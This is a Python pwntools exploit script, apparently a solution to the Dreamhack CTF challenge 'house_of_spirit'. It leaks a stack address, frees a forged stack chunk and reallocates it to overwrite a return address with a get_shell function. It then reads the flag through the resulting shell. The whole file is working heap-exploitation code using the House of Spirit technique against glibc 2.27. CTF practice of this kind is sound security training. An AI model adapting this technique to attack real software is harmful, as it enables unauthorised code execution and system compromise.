#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 11161
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./house_of_spirit_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.27.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x0000000000400A70
            b* 0x0000000000400AFF
            b* 0x0000000000400AC8
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(size, data):
    p.sendlineafter(b'> ', str(1))
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Data: ', data)

def free(addr):
    p.sendlineafter(b'> ', str(2))
    p.sendlineafter(b'Addr: ', str(addr))

# VARIABLE
ptr = 0x6010c0

# PAYLOAD
payload = flat(
    b'a'*8,
    b'@'
    )
p.send(payload)
p.recvuntil(b'name: ')
stack_leak = int(p.recvuntil(b':', drop=True), 16)
print("Stack leak: " + hex(stack_leak))

# GDB()
free(stack_leak + 0x10)
add(0x30, b'a'*0x28 + p64(exe.sym.get_shell))
p.sendlineafter(b'> ', str(3))
p.sendline(b'cat flag')

p.interactive()